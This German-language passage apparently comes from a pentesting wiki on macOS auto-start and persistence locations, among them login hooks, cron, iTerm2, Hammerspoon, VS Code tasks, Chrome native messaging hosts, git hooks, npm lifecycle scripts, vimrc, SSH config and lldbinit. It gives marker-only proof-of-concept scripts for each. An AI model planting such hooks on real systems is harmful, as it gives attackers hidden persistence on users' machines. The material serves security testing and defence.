QuickLook-Plugins können ausgeführt werden, wenn du **die Vorschau einer Datei aufrufst** (die Leertaste drücken, während die Datei im Finder ausgewählt ist) und ein **Plugin installiert ist, das diesen Dateityp unterstützt**.<sup>[[8]](#references)</sup>

Du kannst ein eigenes QuickLook-Plugin kompilieren, es an einem der oben genannten Speicherorte ablegen, damit es geladen wird, und dann zu einer unterstützten Datei navigieren und die Leertaste drücken, um es auszulösen.

Diese Pfade beziehen sich auf ältere `.qlgenerator`-Bundles; [Apples Architekturleitfaden zu Quick Look](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/Quicklook_Programming_Guide/Articles/QLArchitecture.html) beschreibt die Suchreihenfolge und die Zuordnung unterstützter Dateitypen. Aktuelle Quick Look-**App-Erweiterungen** werden mit einer App gebündelt und haben andere Registrierungs- und Ausführungsregeln. Dass ein Generator vorhanden ist, belegt weder, dass er bei der Typauswahl Vorrang hat, noch, dass sein Code direkt im Finder ausgeführt wird. Der Pfad für ältere Generatoren wurde anhand der Dokumentation und der Verzeichnisinhalte geprüft; auf dem Research-Mac war kein Generator installiert oder geladen.

### ~~Login/Logout-Hooks~~

> [!CAUTION]
> Bei mir hat das nicht funktioniert, weder mit dem LoginHook des Benutzers noch mit dem LogoutHook von root.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0022/](https://theevilbit.github.io/beyond/beyond_0022/)<sup>[[9]](#references)</sup>

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC-Umgehung: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- Du musst etwas wie `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` ausführen können.
  - Zu finden in `~/Library/Preferences/com.apple.loginwindow.plist`

Sie sind veraltet, können aber verwendet werden, um beim Anmelden eines Benutzers Befehle auszuführen.<sup>[[9]](#references)</sup>

```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```

Diese Einstellung wird in `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` gespeichert.

```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
    LoginHook = "/Users/username/hook.sh";
    LogoutHook = "/Users/username/hook.sh";
    MiniBuddyLaunch = 0;
    TALLogoutReason = "Shut Down";
    TALLogoutSavesState = 0;
    oneTimeSSMigrationComplete = 1;
}
```

Um es zu löschen:

```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```

Der Eintrag für den root-Benutzer wird unter **`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`** gespeichert.

## Bedingter Sandbox Bypass

> [!TIP]
> Hier findest du Startorte, die für **sandbox bypass** nützlich sind. Damit kannst du etwas einfach ausführen, indem du es **in eine Datei schreibst** und auf eher ungewöhnliche Bedingungen setzt, etwa bestimmte **installierte Programme, Aktionen eines „ungewöhnlichen“ Benutzers** oder bestimmte Umgebungen.

### Cron

**Write-up**: [https://theevilbit.github.io/beyond/beyond_0004/](https://theevilbit.github.io/beyond/beyond_0004/)<sup>[[10]](#references)</sup>

- Nützlich für sandbox bypass: [✅](https://emojipedia.org/check-mark-button)
  - Du musst jedoch das Programm `crontab` ausführen können
  - Oder root sein
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Speicherort

- **`/usr/lib/cron/tabs/`**
  - Für direkten Schreibzugriff ist root erforderlich. Kein root erforderlich, wenn du `crontab <file>` ausführen kannst.
  - **Auslöser**: Der Zeitplan in der installierten crontab. `at` und `periodic` sind separate Mechanismen, die weiter unten beschrieben werden.

#### Beschreibung & Ausnutzung

Liste die Cron-Jobs des **aktuellen Benutzers** mit:

```bash
crontab -l
```

Der launchd-plist des System-Cron-Daemons enthält einen `QueueDirectories`-Eintrag für `/usr/lib/cron/tabs`; dort werden die installierten Crontabs der Benutzer gespeichert. Zum Überprüfen der Crontabs anderer Benutzer sind Root-Rechte erforderlich:

```bash
plutil -p /System/Library/LaunchDaemons/com.vix.cron.plist
ls -ld /usr/lib/cron/tabs
```

In einem Wegwerf-Account lässt sich mit `crontab` ein Cron-Eintrag für den Benutzer installieren, der nur einen Marker enthält, und nach der Beobachtung wieder entfernen. `crontab <file>` **ersetzt die gesamte vorhandene Crontab des Accounts**. Ist der Account nicht entbehrlich, sollte die Crontab daher vorher gesichert und anschließend wiederhergestellt werden:<sup>[[10]](#references)</sup>

```bash
lab=$(mktemp -d)
had_original=0
if crontab -l > "$lab/original" 2>/dev/null; then had_original=1; fi
cleanup_cron_poc() {
  if [ "$had_original" -eq 1 ]; then crontab "$lab/original"; else crontab -r; fi
  rm -r "$lab"
}
trap cleanup_cron_poc EXIT
printf '* * * * * /usr/bin/touch %s/ran\n' "$lab" > "$lab/new"
crontab "$lab/new"
sleep 65
test -e "$lab/ran" && echo 'cron fired'
```

### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond_0002/](https://theevilbit.github.io/beyond/beyond_0002/)<sup>[[11]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
- TCC-Bypass: [✅](https://emojipedia.org/check-mark-button)
  - iTerm2 hatte früher erteilte TCC-Berechtigungen

#### Speicherorte

- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
  - **Auslöser**: iTerm2 mit einem geeigneten Python-API-Script in diesem Ordner starten
- **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
  - **Auslöser**: iTerm2 starten; der AppleScript-Startup-Hook ist separat dokumentiert
- **`~/Library/Preferences/com.googlecode.iterm2.plist`**
  - **Auslöser**: Eine Sitzung mit dem Profil erstellen, dessen Befehl oder initialer Text die Payload aufruft

#### Beschreibung & Exploitation

Der [aktuelle iTerm2-Python-API-Leitfaden](https://iterm2.com/python-api/tutorial/running.html#auto-run-scripts) dokumentiert das automatische Ausführen von **Python**-Scripts in `~/Library/Application Support/iTerm2/Scripts/AutoLaunch`. Er belegt nicht, dass eine beliebige ausführbare `.sh`-Datei in diesem Ordner ausgeführt wird. Speichere dies für ein Wegwerfkonto als `~/Library/Application Support/iTerm2/Scripts/AutoLaunch/ht-marker.py`:

```python
import iterm2
from pathlib import Path

async def main(connection):
    Path('/tmp/ht-iterm-autolaunch-marker').touch()

iterm2.run_until_complete(main)
```

Der [aktuelle AppleScript-Leitfaden für iTerm2](https://iterm2.com/documentation-scripting.html) dokumentiert separat `~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt` sowie einen Fallback auf `~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt`, wenn der moderne Ordner nicht vorhanden ist. Ein AppleScript, das nur einen Marker setzt, sieht so aus:

```applescript
do shell script "touch /tmp/iterm2-autolaunchscpt"
```

Diese Skriptbeispiele wurden anhand der Dokumentation von iTerm2 überprüft, aber nicht in einer aktiven Desktop-Sitzung ausgeführt. Entferne nach dem Testen in einem Wegwerfkonto das Testskript und entweder `/tmp/ht-iterm-autolaunch-marker` oder `/tmp/iterm2-autolaunchscpt`.

In den iTerm2-Einstellungen unter **`~/Library/Preferences/com.googlecode.iterm2.plist`** können ein Profilbefehl oder ein Anfangstext festgelegt werden. Letzterer wird in eine Sitzung eingegeben; ob er ausgeführt wird, hängt davon ab, ob eine Shell ihn interpretiert. [Die Dokumentation zu iTerm2-Profilen](https://iterm2.com/documentation-preferences-profiles-general.html) beschreibt den Befehl, der beim Erstellen einer neuen Sitzung mit diesem Profil ausgeführt wird.

Diese Einstellung kann in den iTerm2-Einstellungen konfiguriert werden:

<figure><img src="../images/image (37).png" alt="" width="563"><figcaption></figcaption></figure>

Und der Befehl wird in den Einstellungen angezeigt:

```bash
plutil -p com.googlecode.iterm2.plist
{
  [...]
  "New Bookmarks" => [
    0 => {
      [...]
      "Initial Text" => "touch /tmp/iterm-start-command"
```

Für eine sichere Bewertung kannst du das ausgewählte Profil in den iTerm2-Einstellungen prüfen oder eine Kopie der Einstellungsdatei lesen. Eine Änderung von `Initial Text` in einem aktiven Profil würde sich auf die Sitzungen eines Benutzers auswirken. Daher wurde auf dem Forschungs-Mac keine Einstellung geändert.

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond_0007/](https://theevilbit.github.io/beyond/beyond_0007/)<sup>[[12]](#references)</sup>

- Nützlich, um sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - xbar muss jedoch installiert sein
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Es fordert Bedienungshilfen-Berechtigungen an

#### Speicherort

- **`~/Library/Application\ Support/xbar/plugins/`**
  - **Auslöser**: Sobald xbar ausgeführt wird

#### Beschreibung

Wenn das beliebte Programm [**xbar**](https://github.com/matryer/xbar) installiert ist, kann ein Shell-Skript in **`~/Library/Application\ Support/xbar/plugins/`** geschrieben werden, das beim Start von xbar ausgeführt wird:<sup>[[12]](#references)</sup>

```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0008/](https://theevilbit.github.io/beyond/beyond_0008/)<sup>[[13]](#references)</sup>

- Nützlich, um die sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - Hammerspoon muss jedoch installiert sein
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Die App fordert Bedienungshilfen-Berechtigungen an

#### Speicherort

- **`~/.hammerspoon/init.lua`**
  - **Auslöser**: Sobald Hammerspoon ausgeführt wird

#### Beschreibung

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) dient als Automatisierungsplattform für **macOS** und verwendet dafür die **LUA-Skriptsprache**. Besonders hervorzuheben ist, dass sich vollständiger AppleScript-Code integrieren und Shell-Skripte ausführen lassen, wodurch sich die Skriptfunktionen erheblich erweitern.<sup>[[13]](#references)</sup>

Die App sucht nach einer einzelnen Datei, `~/.hammerspoon/init.lua`. Beim Start wird das Skript ausgeführt.

```bash
mkdir -p "$HOME/.hammerspoon"
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("/Applications/iTerm.app/Contents/MacOS/iTerm2")
EOF
```

### BetterTouchTool

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
  - BetterTouchTool muss jedoch installiert sein
- TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
  - Es fordert Automation-Shortcuts- und Bedienungshilfen-Berechtigungen an

#### Speicherort

- Eine Skriptdatei, auf die in einem aktivierten BetterTouchTool-Preset **bereits verwiesen wird**, oder die Konfiguration dieses Presets unter `~/Library/Application Support/BetterTouchTool/`. Der genaue Skriptpfad hängt davon ab, wie das Preset konfiguriert wurde.

[Die Aktionsreferenz von BetterTouchTool](https://docs.folivora.ai/docs/actions/action-definitions/) beschreibt Shell-Skript- und Hintergrundbefehl-Aktionen. Das konfigurierte Tastatur-, Maus-, Touch-, Widget- oder sonstige Ereignis muss eintreten, während das betreffende Preset aktiv ist; [der Trigger-Leitfaden](https://docs.folivora.ai/docs/configuration/new-trigger/) zeigt, wie diese Zuordnung funktioniert. Eine beliebige Datei im Application-Support-Verzeichnis ist kein Trigger. Eine bereits konfigurierte Aktion, die ein externes, beschreibbares Skript lädt, ist ein enger umrissenes Schreibziel, das zur Ausführung führt. Der Code wird mit dem Benutzerkonto von BetterTouchTool und vorbehaltlich der tatsächlich gewährten macOS-Berechtigungen ausgeführt. BetterTouchTool war auf dem Research-Mac nicht unter `/Applications` vorhanden, daher wurde lokal kein Preset geändert oder ausgeführt.

### Alfred

- Nützlich zum Umgehen der Sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Alfred muss jedoch installiert sein
- TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
  - Es fordert Automation-, Bedienungshilfen- und sogar Festplattenvollzugriff-Berechtigungen an

#### Speicherort

- Ein Skript oder eine Datei, auf die in einem installierten Alfred-Workflow **bereits verwiesen wird**, oder dieser Workflow im vom Benutzer konfigurierten Verzeichnis `Alfred.alfredpreferences`. Das Einstellungsverzeichnis kann synchronisiert sein und liegt nicht an einem universell festgelegten Pfad.

[Alfreds Workflow-Leitfaden](https://www.alfredapp.com/help/workflows/) beschreibt die Powerpack-Voraussetzung und die Installation über die Benutzeroberfläche. Ein Hotkey, ein Schlüsselwort oder ein anderer konfigurierter Trigger eines installierten Workflows muss ausgelöst werden; [Alfreds Hotkey-Beispiel](https://www.alfredapp.com/help/workflows/triggers/hotkey/creating-a-hotkey-workflow/) veranschaulicht eine Skriptaktion. [Alfreds Referenz zu Umgebungsvariablen](https://www.alfredapp.com/help/workflows/script-environment-variables/) stellt den ausgewählten Einstellungspfad als `alfred_preferences` bereit. Das Ablegen einer nicht registrierten Workflow-Datei in einem beliebigen Verzeichnis beweist nicht, dass sie installiert oder ausgeführt wird. Der Code wird mit dem Konto des angemeldeten Alfred-Benutzers und den tatsächlich gewährten macOS-Berechtigungen ausgeführt. Alfred war auf dem Research-Mac nicht unter `/Applications` vorhanden, daher wurde dieser Pfad nur anhand der Dokumentation bewertet.

### Raycast Script Commands und Erweiterungsaktualisierung

- **Schreibziel:** Ein ausführbares Skript in einem Verzeichnis, das unter Raycast Settings → Script Commands **bereits hinzugefügt wurde**. Raycast durchsucht kein beliebiges neu erstelltes Verzeichnis. [Raycasts Leitfaden zu Script Commands](https://manual.raycast.com/script-commands) beschreibt die Registrierung von Verzeichnissen.
- **Trigger und Identität:** Ein Benutzer ruft den indizierten Befehl auf, ein konfigurierter Hotkey oder Fallback ruft ihn auf, oder Raycast aktualisiert ein `inline`-Skript zum konfigurierten Zeitpunkt `@raycast.refreshTime`. Das Skript wird über seinen Interpreter mit dem Konto des angemeldeten Raycast-Benutzers ausgeführt. Die [Referenz zu den Upstream-Metadaten](https://github.com/raycast/script-commands#metadata) beschränkt die automatische Aktualisierung auf Inline-Befehle; das [Erweiterungsmanifest von Raycast](https://github.com/raycast/extensions/blob/main/docs/information/manifest.md) unterstützt separat ein `interval` für installierte Erweiterungsbefehle vom Typ `no-view` oder `menu-bar`. Das bloße Hinzufügen eines normalen Script Commands plant keine Ausführung.

Für ein Wegwerfkonto mit einem registrierten Skriptverzeichnis sieht ein Inline-Skript, das nur eine Markierung schreibt, so aus:

```bash
#!/bin/bash
# @raycast.schemaVersion 1
# @raycast.title Auto-start marker
# @raycast.mode inline
# @raycast.refreshTime 1m
/usr/bin/touch /tmp/ht-raycast-refresh-marker
echo ready
```

Speichere sie im registrierten Verzeichnis, mache sie ausführbar und lass Raycast sie aktualisieren. Entferne anschließend diese Datei und `/tmp/ht-raycast-refresh-marker`. Raycast wurde auf dem Research-Mac nicht unter seinem üblichen Namen in `/Applications` gefunden; daher ist dies durch Dokumentation belegt und wurde nicht lokal ausgeführt. Für Bedienungshilfen, Automation und Dateizugriffe können weiterhin macOS-Berechtigungsabfragen erscheinen.

### Automatische Workspace-Aufgaben in Visual Studio Code

- **Schreibziel:** `.vscode/tasks.json` in einem Workspace, den der Benutzer öffnen wird.
- **Auslöser:** Öffnen dieses Workspace in VS Code, jedoch nur, wenn dem Ordner vertraut wird **und** automatische Aufgaben zugelassen wurden. In einem nicht vertrauenswürdigen Workspace werden niemals automatische Aufgaben ausgeführt; die Standardeinstellung fordert den Benutzer vor der ersten automatischen Ausführung zur Bestätigung auf. [VS Code task documentation](https://code.visualstudio.com/docs/debugtest/tasks#_run-behavior) und [Workspace Trust documentation](https://code.visualstudio.com/docs/editing/workspaces/workspace-trust) beschreiben beide Voraussetzungen.
- **Ausführungsidentität:** Das Konto des VS-Code-Benutzers, über den konfigurierten Aufgabenprozess. Dies ist eine anwendungsspezifische Ausführung und keine Persistenz beim Anmelden.

Füge in einem **neuen, wegwerfbaren Workspace** diese reine Marker-Aufgabe in `.vscode/tasks.json` ein:

```json
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "autostart-marker",
      "type": "process",
      "command": "/usr/bin/touch",
      "args": ["${workspaceFolder}/.autostart-task-ran"],
      "problemMatcher": [],
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
```

Nach dem Öffnen des vertrauenswürdigen Workspace und dem Zulassen automatischer Tasks prüfen Sie, ob `.autostart-task-ran` vorhanden ist. Entfernen Sie den Task-Eintrag und die Markierungsdatei, um aufzuräumen. **Dies wurde anhand der Dokumentation von Microsoft und des installierten VS Code-1.139.1-Bundles verifiziert; es wurde nicht in der aktiven Desktop-Sitzung ausgeführt.**

### Chrome native messaging hosts

- **Schreibziel:** `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/<host-name>.json` für den aktuellen Benutzer oder `/Library/Google/Chrome/NativeMessagingHosts/<host-name>.json` für alle Benutzer (Administrator-Schreibrechte erforderlich). Chromium und Chrome for Testing verwenden unterschiedliche Verzeichnisse; siehe [Chromes aktuelle Pfadübersicht](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging#native-messaging-host-location).
- **Auslöser:** Eine installierte Chrome-Erweiterung mit der Berechtigung `nativeMessaging` ruft `chrome.runtime.connectNative()` oder `chrome.runtime.sendNativeMessage()` mit dem exakten Hostnamen aus dem Manifest auf. Chrome startet daraufhin das Host-Executable. Das Öffnen von Chrome allein führt keinen beliebigen neuen native host aus; das Erstellen eines Manifests ohne aufrufende Erweiterung bewirkt nichts. [Chromes native messaging guide](https://developer.chrome.com/docs/extensions/develop/concepts/native-messaging) beschreibt diesen Handshake.
- **Ausführungsidentität:** Das Konto des Chrome-Benutzers. Im Manifest muss ein absoluter Pfad zum Executable angegeben und der Ursprung der aufrufenden Erweiterung explizit zugelassen werden.

In einem Browserkonto zum Wegwerfen mit einer Test-Erweiterung veranschaulicht das folgende Dateipaar die Verbindung zwischen Schreibzugriff und Ausführung. Der Dateiname des Manifests muss mit dessen `name` übereinstimmen, und `TEST_EXTENSION_ID` muss durch die tatsächliche ID dieser Erweiterung ersetzt werden:

```json
{
  "name": "org.hacktricks.marker",
  "description": "Native messaging marker test",
  "path": "/absolute/path/to/ht-native-host.sh",
  "type": "stdio",
  "allowed_origins": ["chrome-extension://TEST_EXTENSION_ID/"]
}
```

Speichere dieses JSON unter `~/Library/Application Support/Google/Chrome/NativeMessagingHosts/org.hacktricks.marker.json`. Das ausschließlich als Marker dienende ausführbare Programm unter `path` im Manifest kann Folgendes enthalten:

```sh
#!/bin/sh
/usr/bin/touch "$HOME/Library/Caches/ht-native-host-ran"
exit 0
```

Nachdem die Test-Extension `chrome.runtime.sendNativeMessage('org.hacktricks.marker', {ping: 1})` von ihrem Service Worker oder ihrer Extension-Seite aufruft, belegt die Markierungsdatei, dass der Host gestartet wurde. Dieser minimale Host implementiert nicht das längenpräfixierte Antwortprotokoll von Chrome, daher meldet die Extension möglicherweise einen Messaging-Fehler, nachdem die Markierungsdatei geschrieben wurde. Entferne zum Aufräumen das Test-Manifest, den Host und die Markierungsdatei. Unter macOS 26.5.2 waren die Chrome-App und beide Manifest-Verzeichnisse vorhanden; **das aktive Chrome-Profil wurde nicht verändert oder verwendet**.

### Karabiner-Elements-Befehle für Tastaturereignisse

- **Schreibziel:** `~/.config/karabiner/karabiner.json` in einem Konto, in dem Karabiner-Elements installiert ist und läuft. [Karabiners Anleitung zum Speicherort der Datei](https://karabiner-elements.pqrs.org/docs/json/location/) besagt, dass die App diese Datei überwacht und nach einem Schreibvorgang neu lädt. JSON-Dateien in `assets/complex_modifications` sind lediglich importierbare Voreinstellungen; eine Regel wird nicht aktiviert, wenn man dort einfach eine Datei ablegt.
- **Auslöser:** Das konfigurierte Tastaturereignis, nachdem die Regel aktiviert wurde. Die Referenz zu [`to.shell_command`](https://karabiner-elements.pqrs.org/docs/json/complex-modifications-manipulator-definition/to/shell-command/) beschreibt die Befehlsausführung. Dadurch wird kein Code beim Anmelden oder bei jedem Schreibvorgang in eine Datei ausgeführt.
- **Ausführungsidentität:** Der angemeldete Benutzer, unter dem der Benutzerprozess von Karabiner läuft. Die eigenen Berechtigungen und jeglicher TCC-Zugriff sind abhängig von App und Version.

Füge in einem entbehrlichen Testkonto dieses Regelobjekt zum Array `complex_modifications.rules` des ausgewählten Profils in `karabiner.json` hinzu und bewahre den Rest des Profils unverändert. Drücke F18, um eine harmlose Markierungsdatei zu erstellen, und entferne anschließend diese Regel und die Markierungsdatei. F18 zu wählen, vermeidet, eine gewöhnliche Eingabetaste zu ersetzen:

```json
{
  "description": "Write a marker on F18",
  "manipulators": [
    {
      "type": "basic",
      "from": { "key_code": "f18" },
      "to": [
        { "shell_command": "/usr/bin/touch /tmp/ht-karabiner-f18" }
      ]
    }
  ]
}
```

Karabiner-Elements war auf dem Testcomputer mit macOS 26.5.2 nicht in `/Applications` installiert. Daher handelt es sich hierbei um einen durch Dokumentation belegten PoC und nicht um ein lokales Laufzeitergebnis.

### Git-Hooks in einem lokalen Repository

- **Schreibziel:** Ein ausführbarer Hook wie `<repo>/.git/hooks/post-checkout`. Wenn `core.hooksPath` bereits festgelegt wurde, verwende stattdessen das konfigurierte Verzeichnis. Ein als normale nachverfolgte Quelldatei committeter Hook wird nicht automatisch in einem Clone installiert.
- **Auslöser:** Der entsprechende Git-Vorgang. `post-checkout` wird beispielsweise nach `git checkout` oder `git switch` ausgeführt und kann auch nach dem Erstellen eines Clones oder Worktrees ausgeführt werden. [Die Hook-Referenz von Git](https://git-scm.com/docs/githooks) führt die Ereignisse und die Anforderung an das Ausführbarkeitsbit auf; [`core.hooksPath`](https://git-scm.com/docs/git-config#Documentation/git-config.txt-corehooksPath) ändert das Verzeichnis, in dem gesucht wird.
- **Ausführende Identität:** Das Konto, unter dem Git ausgeführt wird. Der Hook kann nur ausgeführt werden, wenn das effektive Hooks-Verzeichnis des Repositorys für den Akteur beschreibbar ist und der Benutzer später den entsprechenden Git-Vorgang ausführt.

Dieser PoC, der lediglich eine Markierung erstellt, legt ein vollständig entbehrliches Repository an, installiert einen Hook und wechselt den Branch. Er wurde mit Apple Git 2.50.1 unter macOS 26.5.2 erfolgreich ausgeführt:

```bash
lab=$(mktemp -d)
git -C "$lab" init -q
git -C "$lab" -c user.name=Test -c user.email=test@example.invalid \
  commit --allow-empty -qm baseline
cat > "$lab/.git/hooks/post-checkout" <<EOF
#!/bin/sh
/usr/bin/touch "$lab/ran"
EOF
chmod 700 "$lab/.git/hooks/post-checkout"
git -C "$lab" checkout -qb probe
test -e "$lab/ran" && echo 'post-checkout fired'
rm -r "$lab"
```

### npm lifecycle scripts in einem Projekt

- **Schreibziel:** Die `scripts`-Map in der `package.json` eines beschreibbaren Projekts oder ein installiertes Dependency-Paket, dessen Lifecycle-Script der Benutzer ausführen wird. Dies ist ein Hook im Entwicklungsworkflow und keine Ausführung beim Öffnen eines Verzeichnisses.
- **Auslöser und Identität:** Ein späteres `npm install` oder `npm ci` führt bei aktivierten Lifecycle-Scripts `preinstall`, `install` und `postinstall` als der Benutzer aus, der npm aufruft. Ein gewöhnliches `npm run <name>` führt außerdem passende `pre<name>`- und `post<name>`-Scripts aus. [Die Lifecycle-Referenz von npm](https://docs.npmjs.com/cli/v11/using-npm/scripts) führt die Events auf; [`ignore-scripts`](https://docs.npmjs.com/cli/v11/commands/npm-install#ignore-scripts) kann Install-Lifecycle-Scripts unterdrücken. Versions- und Richtlinieneinstellungen können beeinflussen, was erlaubt ist; prüfe daher die npm-Version des Ziels.

Diese PoC, die nur eine Markierung setzt, wurde mit lokalem npm in einem temporären, leeren Verzeichnis ausgeführt. Sie lädt keine Dependencies herunter und verändert das Projekt eines Benutzers nicht:

```bash
lab=$(mktemp -d)
cat > "$lab/package.json" <<'EOF'
{"name":"ht-autostart-marker","version":"1.0.0","private":true,
 "scripts":{"preinstall":"touch marker-preinstall","postinstall":"touch marker-postinstall"}}
EOF
(cd "$lab" && npm install --ignore-scripts=false --no-audit --no-fund --offline)
test -e "$lab/marker-preinstall" && test -e "$lab/marker-postinstall" && echo 'both lifecycle hooks fired'
rm -r "$lab"
```

Dies unterscheidet sich von Python-Interpreter-Startdateien: npm muss die entsprechende Installations- oder Ausführungsaktion durchführen, während Python-`site`-Code bei einem gewöhnlichen Interpreter-Aufruf geladen werden kann. Generische `Makefile`-Targets und Build-Task-Definitionen erfordern ebenso, dass der Benutzer oder ein bereits konfiguriertes Tool das jeweilige Target aufruft; sie sind keine eigenständigen OS-Autostart-Pfade.

### Vim-Startkonfiguration

- **Schreibziel:** `~/.vimrc` für den Benutzer, der Vim starten wird (oder eine andere Startdatei, die Vim gemäß seiner Initialisierungsreihenfolge auswählt). [Vims Startreferenz](https://vimhelp.org/starting.txt.html) dokumentiert die Datei und die `VIMINIT`-/`EXINIT`-Overrides.
- **Auslöser:** Ein anschließender gewöhnlicher Vim-Start, bei dem diese Konfiguration geladen wird. Vim-Option `-u NONE` umgeht die Benutzer-vimrc. Dabei handelt es sich um eine editorspezifische Ausführung, nicht um einen OS-Login-Auslöser.
- **Ausführungsidentität:** Das Konto des Vim-Benutzers.

Der folgende isolierte PoC wurde mit macOS `/usr/bin/vim` ausgeführt; er schreibt keine tatsächlichen Vim-Einstellungen oder geöffneten Dokumente:

```bash
lab=$(mktemp -d)
printf 'call writefile(["ran"], "%s/marker")\n' "$lab" > "$lab/.vimrc"
env -u VIMINIT -u EXINIT HOME="$lab" /usr/bin/vim -c 'qa!' >/dev/null 2>&1
test -e "$lab/marker" && echo 'vimrc fired'
rm -r "$lab"
```

Neovim hat einen separaten Benutzerkonfigurationspfad, `$XDG_CONFIG_HOME/nvim/init.lua` oder `init.vim`, und lädt außerdem Skripte aus seinen `plugin/`-Runtime-Verzeichnissen gemäß seiner [Startdokumentation](https://neovim.io/doc/user/starting/). Neovim war auf dem macOS-26.5.2-Testsystem nicht installiert, daher wurde diese Variante dort nicht ausgeführt.

### SSH-Client-Konfigurationsbefehle

- **Schreibziel:** `~/.ssh/config` oder eine andere Datei, die diese bereits einbindet. Dies ist eine **Client**-Konfigurationsdatei; sie ist getrennt von der unten beschriebenen serverseitigen `~/.ssh/rc`.
- **Auslöser:** Ein passender `ssh`-Aufruf. `Match exec` führt einen lokalen Befehl aus, während der Client seine Konfiguration auswertet, auch bei `ssh -G`, das die Konfiguration ausgibt, ohne eine Verbindung herzustellen. `ProxyCommand` wird ausgeführt, wenn der Client eine passende Verbindung herstellt. `LocalCommand` wird nur nach einer erfolgreichen Verbindung ausgeführt und erfordert `PermitLocalCommand yes` (Standardwert ist `no`). Diese Befehle haben unterschiedliche Ausführungszeitpunkte und Voraussetzungen; ein Schreibvorgang allein führt sie nicht aus. Siehe die vorgelagerte [OpenSSH-`ssh_config(5)`-Dokumentation](https://github.com/openssh/openssh-portable/blob/master/ssh_config.5).
- **Ausführungsidentität:** Der lokale Benutzer, der `ssh` ausführt. Ein passender Host, eine anwendbare Konfigurationsdatei und alle erforderlichen Verbindungen sind notwendig. `ssh -F` kann eine andere Konfigurationsdatei auswählen.

Dieser PoC, der nur eine Markierung schreibt, wurde mit Apples SSH-Client unter macOS 26.5.2 ausgeführt. `-G` testet `Match exec`, ohne eine Netzwerkverbindung herzustellen oder die echte SSH-Konfiguration des Benutzers einzulesen:

```bash
lab=$(mktemp -d)
cat > "$lab/config" <<EOF
Match host example.invalid exec "/usr/bin/touch $lab/marker"
    User nobody
EOF
ssh -G -F "$lab/config" example.invalid >/dev/null
test -e "$lab/marker" && echo 'Match exec fired'
rm -r "$lab"
```

### Debugger-Initialisierungsdateien

- **Schreibziel:** `~/.lldbinit` oder die Datei mit höherer Priorität für die jeweilige Anwendung, etwa `~/.lldbinit-lldb`. LLDB liest beim Start des Debuggers eine dieser Dateien. Eine `.lldbinit` im aktuellen Verzeichnis wird **nicht** standardmäßig ausgeführt; der Benutzer muss `target.load-cwd-lldbinit` aktivieren oder `--local-lldbinit` übergeben. Siehe das [LLDB-Handbuch](https://lldb.llvm.org/man/lldb.html).
- **Auslöser und Identität:** Der Benutzer startet LLDB ohne `--no-lldbinit`; Befehle werden als dieser Benutzer ausgeführt. Allein das Öffnen eines Projekts bedeutet nicht, dass die `.lldbinit` des Projekts ausgeführt wird.

Der folgende Test, der nur Marker verwendete, wurde mit LLDB unter macOS 26.5.2 in einem isolierten Home-Verzeichnis und Arbeitsverzeichnis ausgeführt:

```bash
lab=$(mktemp -d)
printf 'script open("%s/marker", "w").write("ran")\n' "$lab" > "$lab/.lldbinit"
(cd "$lab" && HOME="$lab" lldb -b -o quit >/dev/null)
test -e "$lab/marker" && echo 'lldbinit fired'
rm -r "$lab"
```

Für **GDB** führt die [Upstream-Dokumentation zum Start](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Startup.html) `$HOME/Library/Preferences/gdb/gdbinit` und anschließend `~/.gdbinit` unter macOS auf. Eine `.gdbinit` im aktuellen Verzeichnis unterliegt dem [Auto-Load-Sicherheitspfad](https://sourceware.org/gdb/current/onlinedocs/gdb.html/Auto_002dloading-safe-path.html), und `-nx`/`-nh` unterdrücken Initialisierungsdateien. GDB war auf dem Test-Mac nicht installiert, daher wurde diese Variante nicht lokal getestet.

### SSHRC

Writeup: [https://theevilbit.github.io/beyond/beyond_0006/](https://theevilbit.github.io/beyond/beyond_0006/)<sup>[[14]](#references)</sup>

- Nützlich, um die Sandbox zu umgehen: [✅](https://emojipedia.org/check-mark-button)
  - SSH muss jedoch aktiviert und verwendet werden
- TCC-Umgehung: [✅](https://emojipedia.org/check-mark-button)
  - SSH-Nutzung hatte FDA-Zugriff

#### Speicherort

- **`~/.ssh/rc`**
  - **Auslöser**: Anmeldung via SSH
